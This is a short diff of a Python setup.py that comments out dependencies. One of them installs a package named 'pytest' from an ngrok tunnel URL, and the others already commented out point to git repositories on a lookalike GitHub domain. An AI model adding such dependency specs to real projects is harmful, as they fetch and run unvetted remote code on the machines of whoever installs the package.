@@ -31,8 +31,8 @@ setup(
     setup_requires=['requests'],  # This will try to install requests before setup
     install_requires=[
         'requests',
-        'atlassian-python-api',
-        'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/bugabuga/',
+        # 'atlassian-python-api',
+        # 'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/bugabuga/',
         # 'python-gearman @ git+https://github.r0l.me/rreissdorker/snyk-peak.git',
         # 'pytest @ git+https://github.r0l.me/ravivzomer/tb.git',
     ],
